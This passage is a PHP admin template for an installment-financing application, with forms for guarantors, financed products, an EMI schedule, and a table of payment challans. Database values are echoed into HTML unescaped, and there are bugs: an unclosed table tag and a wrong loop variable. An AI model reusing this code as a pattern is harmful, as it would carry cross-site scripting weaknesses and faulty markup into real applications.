                                                            <input type="text" id="relation'.$i.'" name="relation['.$i.']" value="'.$applicantGuarantor['relation'].'" class="form-control" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Know applicant? <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="years_know['.$i.']" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach ($knownyears as $years):
                                                                    echo'<option value="'.$years['id'].'" '.($applicantGuarantor['years_know']==$years['id'] ? "selected" : "" ).'>'.$years['name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">City <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="id_city['.$i.']" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach($Cities as $city):
                                                                    echo'<option value="'.$city['city_id'].'" '.($city['city_id']==$applicantGuarantor['id_city'] ? "selected" : "" ).'>'.$city['city_name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="form-group">
                                                        <label class="form-label">Address <span class="text-danger">*</span></label>
                                                        <textarea id="address'.$i.'" name="address['.$i.']" class="form-control">'.$applicantGuarantor['address'].'</textarea>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        ';
                                    endforeach;
                                endif;
                                for ($ir=($i+1); $ir <=2 ; $ir++): 
                                    echo '
                                    <div class="expanel expanel-primary">
                                        <div class="expanel-heading">
                                            <h3 class="expanel-title">Guarantor '.$i.'</h3>
                                        </div>
                                        <div class="expanel-body">
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Name <span class="text-danger">*</span></label>
                                                            <input type="text" name="name['.$i.']" class="form-control" placeholder="Enter Name" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">CNIC <span class="text-danger">*</span></label>
                                                            <input type="text" name="cnic['.$i.']" class="form-control" placeholder="CNIC Number" required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">CNIC Picture <span class="text-danger">*</span></label>
                                                            <input type="file" accept="image/*" name="cnic_photo['.$i.']" class="form-control" required>
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Mobile# <span class="text-danger">*</span></label>
                                                            <input type="text" name="mobile['.$i.']" class="form-control" placeholder="Enter Number"
                                                                required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">WhatsApp <span class="text-danger">*</span></label>
                                                            <input type="text" name="whatsapp['.$i.']" class="form-control" placeholder="WhatsApp Number"
                                                                required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Email <span class="text-danger">*</span></label>
                                                            <input type="email" name="email['.$i.']" class="form-control" placeholder="example@domain.com"
                                                                required>
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Relationship <span class="text-danger">*</span></label>
                                                            <input type="text" name="relation['.$i.']" class="form-control" placeholder="Enter Relation"
                                                                required>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">Know applicant? <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="years_know['.$i.']" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach ($knownyears as $years):
                                                                    echo'<option value="'.$years['id'].'">'.$years['name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </div>
                                                    <div class="col">
                                                        <div class="form-group">
                                                            <label class="form-label">City <span class="text-danger">*</span></label>
                                                            <select class="form-control select2-show-search" name="id_city['.$i.']" data-placeholder="Choose one" required>
                                                                <option label="Choose one"></option>';
                                                                foreach($Cities as $city):
                                                                    echo'<option value="'.$city['city_id'].'">'.$city['city_name'].'</option>';
                                                                endforeach;
                                                                echo'
                                                            </select>
                                                        </div>
                                                    </div>
                                                </div>
                                    
                                                <div class="row">
                                                    <div class="form-group">
                                                        <label class="form-label">Address <span class="text-danger">*</span></label>
                                                        <textarea name="address['.$i.']" class="form-control" placeholder="Write Address"
                                                            required></textarea>
                                                    </div>
                                                </div>
                                        </div>
                                    </div>';
                                endfor;
                                echo '
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="update_applicant_guarantor" class="btn btn-primary">Save Information</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>   
                        </div>
                        <div class="tab-pane mt-3 '.($step==4 ? "active show" :"").'" id="assignedProducts">
                            <div class="row">
                                <div class="col-12 col-sm-12">
                                    <div class="expanel expanel-primary">
                                        <div class="expanel-heading">
                                            <h3 class="expanel-title">Product List</h3>
                                        </div>
                                        <div class="expanel-body">
                                            <div class="table-responsive">
                                                <table id="data-table" class="table text-nowrap mb-0 table-bordered">
                                                    <thead class="table-head">
                                                        <tr>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-5">Sr#</th>
                                                            <th class="bg-transparent border-bottom-0">Product</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-10">Condition</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-10">Model</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-10">Total Paid</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-10">Total Pending</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-10">Finance Amount</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-10">Finance Mode</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-7">Action</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody class="table-body">';
                                                        if($assignedProducts):
                                                            $sr = 0;
                                                            foreach($assignedProducts as $assigned):
                                                                $sr++;
                                                                echo '
                                                                <tr>
                                                                    <td class="text-muted fs-14 fw-semibold text-center">'.$sr.'</td>
                                                                    <td class="text-muted fs-14">
                                                                        <div class="d-flex align-items-center">
                                                                            <span class="data-image avatar avatar-md rounded-circle" style="background-image: url(uploads/images/products/'.$assigned['product_image'].')"></span>
                                                                            <div class="user-details ms-2">
                                                                                <h6 class="mb-0">'.$assigned['product_name'].'</h6>
                                                                                <span class="text-muted fs-12">'.$assigned['product_code'].'</span>
                                                                            </div>
                                                                        </div>
                                                                    </td>
                                                                    <td class="text-muted fs-14  text-center">'.get_producttypes($assigned['product_nature']).'</td>
                                                                    <td class="text-muted fs-14  text-center">'.$assigned['product_model'].'</td>
                                                                    <td class="text-muted fs-14  text-center">'.($assigned['total_paid'] != '' ? $assigned['total_paid'] : 0).'</td>
                                                                    <td class="text-muted fs-14  text-center">'.($assigned['total_amount'] - $assigned['total_paid']).'</td>
                                                                    <td class="text-muted fs-14  text-center">'.$assigned['financing_amount'].'</td>
                                                                    <td class="text-muted fs-14 text-center">'.get_financemode($assigned['financing_mode']).'</td>
                                                                    <td class="text-muted fs-14 text-center">
                                                                        <a class="modal-effect viewListChallansModel btn btn-xs btn-warning me-2" data-bs-effect="effect-scale" data-bs-toggle="modal" 
                                                                        data-ap-products-id = "'.$assigned['ap_products_id'].'"
                                                                        data-applicant-id = "'.$ap_id.'"
                                                                        href="#viewListChallans">
                                                                            <i class="fe fe-eye"></i>
                                                                        </a>';
                                                                        if($assigned['count_challan'] < 1):
                                                                            echo '
                                                                            <a class="btn btn-xs btn-info me-2" href="applicants.php?view=edit&ap_id='.$ap_id.'&ap_pro_id='.$assigned['ap_products_id'].'&step=5"><i class="fe fe-edit"></i></a>';
                                                                        endif;
                                                                        echo'
                                                                    </td>
                                                                </tr>';
                                                            endforeach;
                                                        endif;
                                                        echo '
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div><!-- COL END -->
                            </div>
                        </div>
                        <div class="tab-pane mt-3 '.($step==5 ? "active show" :"").'" id="editProduct">
                            <form action="applicants.php?view=edit&ap_id='.$ap_id.'&step=4" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">  
                                <input type="hidden" name="id_applicant" value="'.$ap_id.'" required>
                                <input type="hidden" name="ap_products_id" value="'.(isset($ApplicantProduct['ap_products_id']) ? $ApplicantProduct['ap_products_id'] : '').'" required>
                                <div class="expanel expanel-primary">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Update Product</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Product <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="id_product" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        if($Products):
                                                            foreach ($Products as $product):
                                                                echo'<option value="'.$product['product_id'].'" '.($ApplicantProduct['id_product'] == $product['product_id'] ? 'selected' : '').'>'.$product['product_name'].'</option>';
                                                            endforeach;
                                                        endif;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Nature of Product <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="product_nature" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach($producttypes as $type):
                                                            echo'<option value="'.$type['id'].'" '.($ApplicantProduct['product_nature'] == $type['id'] ? 'selected' : '').'>'.$type['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Model <span class="text-danger">*</span></label>
                                                    <input type="text" name="product_model" class="form-control" value="'.$ApplicantProduct['product_model'].'" placeholder="Model" required>
                                                </div>
                                            </div>
                                        </div>
                            
                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Other Details <span class="text-danger">*</span></label>
                                                <textarea name="product_other_details" class="form-control"  placeholder="Product Other Details" required>'.$ApplicantProduct['product_other_details'].'</textarea>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="expanel expanel-info">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Finance</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Actual Value of Product <span class="text-danger">*</span></label>
                                                    <input type="number" name="actual_price" value="'.$ApplicantProduct['actual_price'].'" id="actual_price" class="form-control advance"  required>
                                                </div>
                                            </div>
                                            <div class="col">
                                               <div class="form-group">
                                                   <label class="form-label">Security Amount <span class="text-danger">*</span></label>
                                                   <input type="number" name="security_amount" id="security_amount" value="'.$ApplicantProduct['security_amount'].'" class="form-control" required>
                                               </div>
                                           </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Advance/Down Amount <span class="text-danger">*</span></label>
                                                    <input type="number" name="advance_amount" id="advance_amount" value="'.$ApplicantProduct['advance_amount'].'" class="form-control advance" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Required Financing / Loan Amount (Rs.) <span class="text-danger">*</span></label>
                                                    <input type="number" id="loan_amount" name="financing_amount" value="'.$ApplicantProduct['financing_amount'].'" class="form-control loan"  required readonly>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Tenure (Number of Months) <span class="text-danger">*</span></label>
                                                    <input type="number" id="number_of_months" name="number_of_months" value="'.$ApplicantProduct['number_of_months'].'" class="form-control"  required >
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Service Charges <span class="text-danger">*</span></label>
                                                    <input type="number" name="interest_rate" id="interest" value="'.($ApplicantProduct['interest_rate'] != '' ? $ApplicantProduct['interest_rate'] : $interest).'" class="form-control"  required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Financing Mode <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="financing_mode" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach($financeMode as $mode):
                                                            echo'<option value="'.$mode['id'].'" '.($ApplicantProduct['financing_mode'] == $mode['id'] ? 'selected' : '').'>'.$mode['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Installment Due Date <span class="text-danger">*</span></label>
                                                    <input type="date" name="installment_due_date" value="'.$ApplicantProduct['installment_due_date'].'" class="form-control"  required>
                                                </div>
                                            </div>
                                        </div>

                                        <div class="row">
                                            <div class="form-group mt-3">
                                                <button type="button" name="calculate_finance" id="calculate_finance" onclick="getFinance()" class="btn btn-info">Calculate Financial
                                                Details</button>
                                            </div>
                                        </div>
                                        <div id="finanaceData">';
                                            $financing_amount   = $ApplicantProduct['financing_amount'];
                                            $months             = $ApplicantProduct['number_of_months'];
                                            $interest           = $ApplicantProduct['interest_rate'] ;
                                            $monthlyInstallment = round(PMT($interest, $months, $financing_amount));
                                            echo '
                                            <div class="row mt-3">
                                                <div class="col">
                                                    <div class="form-group">
                                                        <label for="monthly_installment">Equal Monthly Installment (Rs.)</label>
                                                        <input type="text" class="form-control" id="monthly_installment" name="monthly_installment" value="'.$monthlyInstallment.'" readonly required>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="expanel expanel-warning mt-3">
                                                <div class="expanel-heading">
                                                    <h3 class="expanel-title">Finance</h3>
                                                </div>
                                                <div class="expanel-body">
                                                    <div class="table-responsive">
                                                        <table id="data-table" class="table text-nowrap mb-0 table-bordered
                                                            <thead class="table-head">
                                                                <tr>
                                                                    <th class="bg-transparent border-bottom-0 text-center wp-5">Month</th>
                                                                    <th class="bg-transparent border-bottom-0">EMI</th>
                                                                    <th class="bg-transparent border-bottom-0">Service Charges</th>
                                                                    <th class="bg-transparent border-bottom-0">Principal Repayment</th>
                                                                    <th class="bg-transparent border-bottom-0">Principal O/S</th>
                                                                </tr>
                                                                <tr>
                                                                    <th class="bg-transparent border-bottom-0 text-center wp-5"></th>
                                                                    <th class="bg-transparent border-bottom-0"></th>
                                                                    <th class="bg-transparent border-bottom-0"></th>
                                                                    <th class="bg-transparent border-bottom-0"></th>
                                                                    <th class="bg-transparent border-bottom-0">'.number_format($financing_amount).'</th>
                                                                </tr>
                                                            </thead>
                                                            <tbody class="table-body">';
                                                                
                                                                    $monthlyInstallmentGrandTotal 	= 0;
                                                                    $ServiceChargesGrandTotal 		= 0;
                                                                    $principalRepaymentGrandTotal 	= 0;
                                                                    $remainingLoanAmountGrandTotal	= 0;
                                                                    $chargesamount 					= 0;
                                                                    $Principalamount 				= $financing_amount;

                                                                for($i=1; $i<=$ApplicantProduct['number_of_months']; $i++){ 
                                                                                        
                                                                                        
                                                                    $PrincipalOS 		= ($Principalamount - $principalRepaymentGrandTotal);
                                                                    $ServiceCharges 	= ((($interest/12) * $PrincipalOS)/100);
                                                                    $PrincipalRepayment = ceil($monthlyInstallment - floor($ServiceCharges));
                                                                    echo '
                                                                    <tr>
                                                                        <th scope="row" style="text-align:center; width:70px;">'.$i.'</th>
                                                                        <td>'.number_format($monthlyInstallment).'</td>
                                                                        <td>'.number_format($ServiceCharges).'</td>
                                                                        <td>'.number_format($PrincipalRepayment).'</td>
                                                                        <td>'.number_format($PrincipalOS-$PrincipalRepayment).'</td>
                                                                    </tr>';
                                                                    $principalRepaymentGrandTotal 	= ($principalRepaymentGrandTotal + $PrincipalRepayment);
                                                                    $monthlyInstallmentGrandTotal 	= ($monthlyInstallmentGrandTotal + $monthlyInstallment);
                                                                    $ServiceChargesGrandTotal 		= ($ServiceChargesGrandTotal + $ServiceCharges);
                                                                    $remainingLoanAmountGrandTotal  = ($remainingLoanAmountGrandTotal + ($PrincipalOS));
                                                                }
                                                            
                                                                echo '
                                                                    <tr>
                                                                        <th></th>
                                                                        <th>'.number_format($monthlyInstallmentGrandTotal).'</th>
                                                                        <th>'.number_format($ServiceChargesGrandTotal).'</th>
                                                                        <th>'.number_format($principalRepaymentGrandTotal).'</th>
                                                                        <th>'.number_format($principalRepaymentGrandTotal + $ServiceChargesGrandTotal).'</th>
                                                                    </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                        <!--<div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Create Advance Challan  <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="create_challan" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach($statusyesno as $yesno):
                                                            echo'<option value="'.$yesno['id'].'">'.$yesno['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                        </div>-->

                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Remarks <span class="text-danger">*</span></label>
                                                <textarea name="remarks" class="form-control" placeholder="Remarks" required>'.$ApplicantProduct['remarks'].'</textarea>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="update_applicant_product" class="btn btn-primary">Save Information</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>   
                        </div>
                        <div class="tab-pane mt-3 '.($step==6 ? "active show" :"").'" id="newProduct">
                            <form action="applicants.php?view=edit&ap_id='.$ap_id.'&step=4" enctype="multipart/form-data" autocomplete="off" method="post" accept-charset="utf-8">  
                                <input type="hidden" name="id_applicant" value="'.$ap_id.'" required>
                                <div class="expanel expanel-primary">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">New Product</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Product <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="id_product" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        if($Products):
                                                            foreach ($Products as $product):
                                                                echo'<option value="'.$product['product_id'].'">'.$product['product_name'].'</option>';
                                                            endforeach;
                                                        endif;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Nature of Product <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="product_nature" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach($producttypes as $type):
                                                            echo'<option value="'.$type['id'].'">'.$type['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Model <span class="text-danger">*</span></label>
                                                    <input type="text" name="product_model" class="form-control" placeholder="Model" required>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Other Details <span class="text-danger">*</span></label>
                                                <textarea name="product_other_details" class="form-control" placeholder="Product Other Details" required></textarea>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="expanel expanel-info">
                                    <div class="expanel-heading">
                                        <h3 class="expanel-title">Finance</h3>
                                    </div>
                                    <div class="expanel-body">
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Actual Value of Product <span class="text-danger">*</span></label>
                                                    <input type="number" name="actual_price" id="actual_price1" class="form-control" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                               <div class="form-group">
                                                   <label class="form-label">Security Amount <span class="text-danger">*</span></label>
                                                   <input type="number" name="security_amount" id="security_amount1" class="form-control" required>
                                               </div>
                                           </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Advance/Down Amount <span class="text-danger">*</span></label>
                                                    <input type="number" name="advance_amount" id="advance_amount1" class="form-control advance1" required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Required Financing / Loan Amount (Rs.) <span class="text-danger">*</span></label>
                                                    <input type="number" id="loan_amount1" name="financing_amount" class="form-control loan1"  required readonly>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Tenure (Number of Months) <span class="text-danger">*</span></label>
                                                    <input type="number" id="number_of_months1" name="number_of_months" class="form-control"  required >
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Service Charges <span class="text-danger">*</span></label>
                                                    <input type="number" name="interest_rate" id="interest1" value="'.$interest_rate.'" class="form-control"  required>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Financing Mode <span class="text-danger">*</span></label>
                                                    <select class="form-control select2-show-search" name="financing_mode" data-placeholder="Choose one" required>
                                                        <option label="Choose one"></option>';
                                                        foreach($financeMode as $mode):
                                                            echo'<option value="'.$mode['id'].'" '.($ApplicantProduct['financing_mode'] == $mode['id'] ? 'selected' : '').'>'.$mode['name'].'</option>';
                                                        endforeach;
                                                        echo'
                                                    </select>
                                                </div>
                                            </div>
                                            <div class="col">
                                                <div class="form-group">
                                                    <label class="form-label">Installment Due Date <span class="text-danger">*</span></label>
                                                    <input type="date" name="installment_due_date" class="form-control"  required>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="form-group mt-3">
                                                <button type="button" name="calculate_finance" id="calculate_finance" onclick="getFinanceNewProduct()" class="btn btn-info">Calculate Financial
                                                Details</button>
                                            </div>
                                        </div>

                                        <div id="finanaceDataNewProduct"></div>

                                        <div class="row">
                                            <div class="form-group">
                                                <label class="form-label">Remarks <span class="text-danger">*</span></label>
                                                <textarea name="remarks" class="form-control" placeholder="Remarks" required></textarea>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="row p-5">
                                    <div class="btn-list text-end">
                                        <button type="submit" name="submit_applicant_product" class="btn btn-primary">Save Information</button>
                                        <a href="applicants.php" class="btn btn-danger">Cancel</a>
                                    </div>
                                </div>
                            </form>   
                        </div>
                        <div class="tab-pane mt-3 '.($step==7 ? "active show" :"").'" id="challans">
                            <div class="row">
                                <div class="col-12 col-sm-12">
                                    <div class="expanel expanel-primary">
                                        <div class="expanel-heading">
                                            <h3 class="expanel-title">Product List</h3>
                                        </div>
                                        <div class="expanel-body">
                                            <div class="table-responsive">
                                                <table class="table table-bordered text-nowrap border-bottom w-100" id="responsive-datatable">
                                                    <thead class="table-head">
                                                        <tr>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-5">Sr#</th>
                                                            <th class="bg-transparent border-bottom-0 wp-10">Challan</th>
                                                            <th class="bg-transparent border-bottom-0 wp-10">ARN</th>
                                                            <th class="bg-transparent border-bottom-0">Applicant Name</th>
                                                            <th class="bg-transparent border-bottom-0 wp-10">Total Amount</th>
                                                            <th class="bg-transparent border-bottom-0 wp-10">Paid Amount</th>
                                                            <th class="bg-transparent border-bottom-0 wp-10">Issue Date</th>
                                                            <th class="bg-transparent border-bottom-0 wp-10">Due Date</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-7">Status</th>
                                                            <th class="bg-transparent border-bottom-0 text-center wp-7">Action</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody class="table-body">';
                                                    if ($applicantChallans):
                                                        $sr = 0;
                                                        foreach($applicantChallans as $challan):
                                                            $sr++;
                                                            echo '
                                                            <tr>
                                                                <td class="text-muted fs-14 fw-semibold text-center">'.$sr.'</td>
                                                                <td class="text-muted fs-14 fw-semibold">'.$challan['challan_no'].'</td>
                                                                <td class="text-muted fs-14 fw-semibold">'.$challan['ap_referenceno'].'</td>
                                                                <td class="text-muted fs-14 fw-semibold">'.$challan['ap_fullname'].'</td>
                                                                <td class="text-muted fs-14 fw-semibold">'.$challan['total_amount'].'</td>
                                                                <td class="text-muted fs-14 fw-semibold">'.$challan['paid_amount'].'</td>
                                                                <td class="text-muted fs-14 fw-semibold">'.$challan['issue_date'].'</td>
                                                                <td class="text-muted fs-14 fw-semibold">'.$challan['due_date'].'</td>
                                                                <td class="text-muted fs-14 text-center">'.get_challanstatus($challan['status']).'</td>
                                                                <td class="text-muted fs-14 text-center">';
                                                                    if($challan['status'] != 1):
                                                                        echo '
                                                                        <a class="btn btn-xs btn-info me-2" href="challans.php?view=edit&id_challan='.$challan['challan_id'].'">
                                                                            <i class="fe fe-edit"></i></a>
                                                                        </a>';
                                                                    endif;
                                                                    echo '
                                                                    <a class="btn btn-xs btn-light" target="_blank" href="challan_print.php?id_challan='.$challan['challan_id'].'">
                                                                        <i class="fe fe-printer"></i>
                                                                    </a>
                                                                </td>
                                                            </tr>';
                                                        endforeach;
                                                    endif;
                                                        echo '
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div><!-- COL END -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>';
?>